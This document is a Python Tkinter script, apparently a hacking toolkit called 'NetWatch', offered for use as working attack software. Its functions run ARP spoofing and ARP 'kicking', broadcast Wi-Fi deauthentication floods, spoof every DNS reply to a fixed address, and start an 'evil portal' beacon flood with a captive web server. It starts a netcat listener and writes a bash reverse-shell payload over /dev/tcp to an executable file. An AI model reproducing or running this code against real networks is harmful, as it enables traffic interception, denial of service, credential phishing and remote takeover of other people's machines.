#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════╗
# ║          NetWatch Toolkit – Ultimate Upgrade             ║
# ║                  Created by Null_Lyfe ☠                  ║
# ╚══════════════════════════════════════════════════════════╝

import os, sys, subprocess, threading, time, socket
from datetime import datetime
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth, sniff, wrpcap, DNS, DNSQR, DNSRR, IP, UDP
import psutil

# ─────────────────── Configuration ───────────────────
LOG_DIR = os.path.expanduser("~/netwatch_logs")
os.makedirs(LOG_DIR, exist_ok=True)

NEON_BG  = "#0d0d0d"
NEON_FG  = "#00ffdd"
BTN_BG   = "#111111"
BTN_FG   = "#00ffaa"
FONT     = ("JetBrains Mono", 10)

def log(tab, msg):
    path = os.path.join(LOG_DIR, f"{tab}.log")
    with open(path, "a") as f:
        f.write(f"[{datetime.now()}] {msg}\n")

# ─────────────────── GUI Boilerplate ───────────────────
class NetWatch(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("NetWatch Toolkit – Ultimate Upgrade")
        self.configure(bg=NEON_BG); self.geometry("850x600")
        style = ttk.Style(self); style.theme_use("clam")
        style.configure("TNotebook", background=NEON_BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=NEON_FG, padding=(10,5), font=FONT)
        style.map("TNotebook.Tab", background=[("selected",NEON_FG)], foreground=[("selected",NEON_BG)])
        style.configure("TFrame", background=NEON_BG)
        style.configure("TLabel", background=NEON_BG, foreground=NEON_FG, font=FONT)
        style.configure("TEntry", fieldbackground="#222", foreground=NEON_FG, insertbackground=NEON_FG, font=FONT)
        style.configure("TButton", background=BTN_BG, foreground=BTN_FG, font=FONT)

        self.notebook = ttk.Notebook(self); self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.tabs = {}
        for name in [
            "Nmap","ARP Scan","ARP Spoof","ARP Kick","Traceroute","Reverse Shell",
            "Evil Portal","Deauth","DNS Spoof","Bandwidth","Packet Capture",
            "MAC Changer","Firewall","Exploit","Export Logs","Reset","Sessions"
        ]:
            frame = ttk.Frame(self.notebook)
            self.notebook.add(frame, text=name)
            txt = tk.Text(frame, bg="#111", fg=NEON_FG, font=FONT, wrap="none")
            txt.pack(fill=tk.BOTH, expand=True, side=tk.LEFT, padx=(0,5), pady=5)
            scroll = ttk.Scrollbar(frame, command=txt.yview); scroll.pack(side=tk.LEFT, fill=tk.Y)
            txt.config(yscrollcommand=scroll.set)
            self.tabs[name] = {"frame": frame, "text": txt}
        self._build_tab_contents()
        self.session_threads = {}

    def _run_thread(self, name, fn, *args):
        """Start a thread, record it, and stream output to the tab."""
        def runner():
            for line in fn(*args):
                self._append(name, line)
            log(name, "Completed")
        t = threading.Thread(target=runner, daemon=True); t.start()
        self.session_threads[name] = t

    def _append(self, tab, msg):
        txt = self.tabs[tab]["text"]
        txt.insert("end", msg)
        txt.see("end")

    def _clear(self, tab):
        self.tabs[tab]["text"].delete("1.0","end")

    def _build_tab_contents(self):
        # Each tab gets its own input area at top
        # We overlay a small frame on top of the text widget to hold controls.
        for name, cfg in self.tabs.items():
            fr = ttk.Frame(cfg["frame"], style="TFrame"); fr.place(relx=0, rely=0, relwidth=1, height=40)
            cfg["input_frame"] = fr

        # Nmap Tab
        nmap = self.tabs["Nmap"]
        ttk.Label(nmap["input_frame"], text="Target:").pack(side=tk.LEFT, padx=5)
        nmap["target"] = ttk.Entry(nmap["input_frame"], width=20); nmap["target"].pack(side=tk.LEFT)
        ttk.Button(nmap["input_frame"], text="Scan svc+ver", command=lambda: self._nmap_scan(False)).pack(side=tk.LEFT, padx=5)
        ttk.Button(nmap["input_frame"], text="WHOIS & Geo", command=lambda: self._nmap_scan(True)).pack(side=tk.LEFT)

        # ARP Scan
        arp = self.tabs["ARP Scan"]
        ttk.Button(arp["input_frame"], text="Run arp-scan", command=self._arp_scan).pack(side=tk.LEFT, padx=5)

        # ARP Spoof
        spoof = self.tabs["ARP Spoof"]
        ttk.Label(spoof["input_frame"], text="Iface:").pack(side=tk.LEFT, padx=2)
        spoof["iface"] = ttk.Entry(spoof["input_frame"], width=8); spoof["iface"].pack(side=tk.LEFT)
        ttk.Label(spoof["input_frame"], text="Target IP:").pack(side=tk.LEFT, padx=2)
        spoof["tip"] = ttk.Entry(spoof["input_frame"], width=12); spoof["tip"].pack(side=tk.LEFT)
        ttk.Label(spoof["input_frame"], text="GW IP:").pack(side=tk.LEFT,padx=2)
        spoof["gw"] = ttk.Entry(spoof["input_frame"], width=12); spoof["gw"].pack(side=tk.LEFT)
        ttk.Button(spoof["input_frame"], text="Start", command=self._arp_spoof).pack(side=tk.LEFT, padx=3)
        ttk.Button(spoof["input_frame"], text="Stop",  command=self._stop_session).pack(side=tk.LEFT)

        # ARP Kick
        kick = self.tabs["ARP Kick"]
        ttk.Label(kick["input_frame"], text="Iface:").pack(side=tk.LEFT, padx=2)
        kick["iface"] = ttk.Entry(kick["input_frame"], width=8); kick["iface"].pack(side=tk.LEFT)
        ttk.Label(kick["input_frame"], text="Target IP:").pack(side=tk.LEFT,padx=2)
        kick["tip"] = ttk.Entry(kick["input_frame"], width=12); kick["tip"].pack(side=tk.LEFT)
        ttk.Button(kick["input_frame"], text="Kick", command=self._arp_kick).pack(side=tk.LEFT,padx=5)

        # Traceroute
        trace = self.tabs["Traceroute"]
        ttk.Label(trace["input_frame"], text="Host:").pack(side=tk.LEFT,padx=5)
        trace["host"] = ttk.Entry(trace["input_frame"], width=20); trace["host"].pack(side=tk.LEFT)
        ttk.Button(trace["input_frame"], text="Run", command=self._traceroute).pack(side=tk.LEFT,padx=5)

        # Reverse Shell
        shell = self.tabs["Reverse Shell"]
        ttk.Label(shell["input_frame"], text="Lport:").pack(side=tk.LEFT,padx=5)
        shell["lport"] = ttk.Entry(shell["input_frame"], width=6); shell["lport"].pack(side=tk.LEFT)
        ttk.Button(shell["input_frame"], text="Start Listener", command=self._start_listener).pack(side=tk.LEFT,padx=5)
        ttk.Button(shell["input_frame"], text="Gen Payload",   command=self._gen_payload).pack(side=tk.LEFT)

        # Evil Portal
        portal = self.tabs["Evil Portal"]
        ttk.Label(portal["input_frame"], text="Iface:").pack(side=tk.LEFT,padx=2)
        portal["iface"] = ttk.Entry(portal["input_frame"], width=8); portal["iface"].pack(side=tk.LEFT)
        ttk.Button(portal["input_frame"], text="Start Portal", command=self._start_portal).pack(side=tk.LEFT,padx=5)
        ttk.Button(portal["input_frame"], text="Stop Portal",  command=self._stop_session).pack(side=tk.LEFT)

        # Deauth
        deauth = self.tabs["Deauth"]
        ttk.Label(deauth["input_frame"], text="Iface:").pack(side=tk.LEFT,padx=2)
        deauth["iface"] = ttk.Entry(deauth["input_frame"], width=8); deauth["iface"].pack(side=tk.LEFT)
        ttk.Label(deauth["input_frame"], text="BSSID").pack(side=tk.LEFT,padx=2)
        deauth["bssid"] = ttk.Entry(deauth["input_frame"], width=18); deauth["bssid"].pack(side=tk.LEFT)
        ttk.Button(deauth["input_frame"], text="Deauth!", command=self._deauth).pack(side=tk.LEFT,padx=5)

        # DNS Spoof
        dns = self.tabs["DNS Spoof"]
        ttk.Button(dns["input_frame"], text="Start Spoof", command=self._dns_spoof).pack(side=tk.LEFT,padx=5)
        ttk.Button(dns["input_frame"], text="Stop",      command=self._stop_session).pack(side=tk.LEFT)

        # Bandwidth
        bw = self.tabs["Bandwidth"]
        ttk.Button(bw["input_frame"], text="Show Graph", command=self._bw_monitor).pack(side=tk.LEFT)

        # Packet Capture
        pcap = self.tabs["Packet Capture"]
        ttk.Label(pcap["input_frame"], text="Iface:").pack(side=tk.LEFT,padx=2)
        pcap["iface"] = ttk.Entry(pcap["input_frame"], width=8); pcap["iface"].pack(side=tk.LEFT)
        ttk.Button(pcap["input_frame"], text="Start Cap", command=self._pcap_capture).pack(side=tk.LEFT,padx=5)
        ttk.Button(pcap["input_frame"], text="Stop",     command=self._stop_session).pack(side=tk.LEFT)

        # MAC Changer
        mac = self.tabs["MAC Changer"]
        ttk.Label(mac["input_frame"], text="Iface:").pack(side=tk.LEFT,padx=2)
        mac["iface"] = ttk.Entry(mac["input_frame"], width=8); mac["iface"].pack(side=tk.LEFT)
        ttk.Button(mac["input_frame"], text="Randomize", command=self._mac_changer).pack(side=tk.LEFT,padx=5)

        # Firewall
        fw = self.tabs["Firewall"]
        ttk.Button(fw["input_frame"], text="Enable UFW",  command=lambda: self._ufw("enable")).pack(side=tk.LEFT,padx=5)
        ttk.Button(fw["input_frame"], text="Disable UFW", command=lambda: self._ufw("disable")).pack(side=tk.LEFT)

        # Exploit Launcher
        ex = self.tabs["Exploit"]
        ttk.Label(ex["input_frame"], text="Search:").pack(side=tk.LEFT,padx=5)
        ex["term"] = ttk.Entry(ex["input_frame"], width=20); ex["term"].pack(side=tk.LEFT)
        ttk.Button(ex["input_frame"], text="Searchsploit", command=self._searchsploit).pack(side=tk.LEFT,padx=5)
        ttk.Button(ex["input_frame"], text="MSFconsole",   command=self._msf_console).pack(side=tk.LEFT)

        # Export Logs / Reset / Sessions
        ttk.Button(self.tabs["Export Logs"]["input_frame"], text="Open Logs Folder",
                   command=lambda: os.system(f'xdg-open "{LOG_DIR}"')).pack(side=tk.LEFT,padx=5)
        ttk.Button(self.tabs["Reset"]["input_frame"],    text="Clear All Tabs",
                   command=lambda: [self._clear(t) for t in self.tabs]).pack(side=tk.LEFT,padx=5)
        ttk.Button(self.tabs["Sessions"]["input_frame"], text="List Threads",
                   command=self._list_sessions).pack(side=tk.LEFT,padx=5)

    # ─────────────────── Attack Implementations ───────────────────

    def _nmap_scan(self, geo):
        tgt = self.tabs["Nmap"]["target"].get().strip()
        if not tgt: return
        def gen():
            cmd = ["nmap","-sV",tgt]
            yield from self._popen_lines(cmd, "Nmap")
            if geo:
                yield "\n[WHOIS]\n"
                yield from self._popen_lines(["whois", tgt], "Nmap")
                yield "\n[GeoIP]\n"
                yield from self._popen_lines(["geoiplookup", tgt], "Nmap")
        self._clear("Nmap"); self._run_thread("Nmap", gen)

    def _arp_scan(self):
        def gen():
            yield from self._popen_lines(["sudo","arp-scan","-l"], "ARP Scan")
        self._clear("ARP Scan"); self._run_thread("ARP Scan", gen)

    def _arp_spoof(self):
        cfg = self.tabs["ARP Spoof"]
        i, t, g = cfg["iface"].get(), cfg["tip"].get(), cfg["gw"].get()
        if not all([i,t,g]): return
        def gen():
            yield f"Starting arpspoof on {t} → {g}\n"
            proc = subprocess.Popen(["sudo","arpspoof","-i",i,"-t",t,"-r",g],
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            for line in proc.stdout:
                yield line.decode()
        self._clear("ARP Spoof"); self._run_thread("ARP Spoof", gen)

    def _arp_kick(self):
        cfg = self.tabs["ARP Kick"]
        i, t = cfg["iface"].get(), cfg["tip"].get()
        if not all([i,t]): return
        def gen():
            yield f"Kicking {t} every 2s…\n"
            while True:
                subprocess.run(["sudo","arping","-c","1","-I",i,t],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)
        self._clear("ARP Kick"); self._run_thread("ARP Kick", gen)

    def _traceroute(self):
        tgt = self.tabs["Traceroute"]["host"].get().strip()
        if not tgt: return
        def gen():
            yield from self._popen_lines(["traceroute", tgt], "Traceroute")
        self._clear("Traceroute"); self._run_thread("Traceroute", gen)

    def _start_listener(self):
        lport = self.tabs["Reverse Shell"]["lport"].get().strip()
        if not lport: return
        def gen():
            yield f"Listening on 0.0.0.0:{lport}\n"
            proc = subprocess.Popen(["sudo","nc","-nlvp",lport],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            for line in proc.stdout:
                yield line.decode()
        self._clear("Reverse Shell"); self._run_thread("Reverse Shell", gen)

    def _gen_payload(self):
        lport = self.tabs["Reverse Shell"]["lport"].get().strip()
        if not lport: return
        payload = f"bash -i >& /dev/tcp/{self._my_ip()}/{lport} 0>&1\n"
        out = os.path.expanduser(f"~/rev_{lport}.sh")
        with open(out,"w") as f: f.write(payload)
        os.chmod(out,0o755)
        self._append("Reverse Shell", f"Payload -> {out}\n"); log("Reverse Shell", f"Gen {out}")

    def _start_portal(self):
        cfg = self.tabs["Evil Portal"]
        i = cfg["iface"].get().strip()
        if not i: return
        def gen():
            # beacon flood
            subprocess.Popen(["sudo","mdk4",i,"b","-s", "MyEvilAP"], stdout=subprocess.DEVNULL)
            # captive portal HTTP
            from http.server import SimpleHTTPRequestHandler, HTTPServer
            os.chdir(os.path.expanduser("~/netwatch_portal"))
            srv = HTTPServer(("0.0.0.0",80), SimpleHTTPRequestHandler)
            self._append("Evil Portal", "Serving portal on port 80\n")
            srv.serve_forever()
        self._clear("Evil Portal"); self._run_thread("Evil Portal", gen)

    def _deauth(self):
        cfg = self.tabs["Deauth"]
        i, bssid = cfg["iface"].get().strip(), cfg["bssid"].get().strip()
        if not all([i,bssid]): return
        def gen():
            pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth()
            self._append("Deauth", f"Sending deauths on {i}\n")
            while True:
                sendp(pkt, iface=i, count=10, inter=0.1, verbose=False)
        self._clear("Deauth"); self._run_thread("Deauth", gen)

    def _dns_spoof(self):
        def handle(pkt):
            if pkt.haslayer(DNSQR):
                qname = pkt[DNSQR].qname
                spoof = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)
                spoof /= DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=qname, rdata="10.0.0.123"))
                sendp(spoof, verbose=False)
                self._append("DNS Spoof", f"Spoofed {qname.decode()}\n")
        self._clear("DNS Spoof")
        t = threading.Thread(target=lambda: sniff(filter="udp port 53", prn=handle), daemon=True)
        t.start(); self.session_threads["DNS Spoof"] = t

    def _bw_monitor(self):
        def gen():
            prev = psutil.net_io_counters()
            while True:
                time.sleep(1)
                cur = psutil.net_io_counters()
                up = (cur.bytes_sent - prev.bytes_sent)/1024
                dn = (cur.bytes_recv - prev.bytes_recv)/1024
                prev = cur
                yield f"↑ {up:.1f} KB/s | ↓ {dn:.1f} KB/s\n"
        self._clear("Bandwidth"); self._run_thread("Bandwidth", gen)

    def _pcap_capture(self):
        cfg = self.tabs["Packet Capture"]
        i = cfg["iface"].get().strip()
        if not i: return
        def gen():
            self._append("Packet Capture", f"Sniffing on {i}…\n")
            pkts = sniff(iface=i, timeout=60)
            out = os.path.join(LOG_DIR, f"cap_{int(time.time())}.pcap")
            wrpcap(out, pkts)
            yield f"Saved {len(pkts)} pkts → {out}\n"
        self._clear("Packet Capture"); self._run_thread("Packet Capture", gen)

    def _mac_changer(self):
        cfg = self.tabs["MAC Changer"]
        i = cfg["iface"].get().strip()
        if not i: return
        out = subprocess.check_output(["sudo","macchanger","-r",i]).decode()
        self._append("MAC Changer", out+"\n"); log("MAC Changer", out)

    def _ufw(self, cmd):
        out = subprocess.check_output(["sudo","ufw",cmd]).decode()
        self._append("Firewall", out+"\n"); log("Firewall", f"ufw {cmd}")

    def _searchsploit(self):
        term = self.tabs["Exploit"]["term"].get().strip()
        if not term: return
        def gen(): yield from self._popen_lines(["searchsploit", term], "Exploit")
        self._clear("Exploit"); self._run_thread("Exploit", gen)

    def _msf_console(self):
        def gen():
            self._append("Exploit", "Launching msfconsole…\n")
            proc = subprocess.Popen(["sudo","msfconsole"], stdin=subprocess.PIPE)
            proc.communicate()
        self._clear("Exploit"); self._run_thread("Exploit", gen)

    def _list_sessions(self):
        for name,t in self.session_threads.items():
            alive = t.is_alive()
            self._append("Sessions", f"{name}: {'running' if alive else 'done'}\n")

    def _stop_session(self):
        # Threads are daemon; cannot kill easily. Just inform.
        self._append("Sessions", "⚠️ Restart tool to kill active loops.\n")

    def _popen_lines(self, cmd, tab):
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in proc.stdout:
            yield line.decode()

    def _my_ip(self):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80)); ip=s.getsockname()[0]; s.close()
        return ip

if __name__ == "__main__":
    if os.geteuid()!=0:
        print("Please run as root"); sys.exit(1)
    NetWatch().mainloop()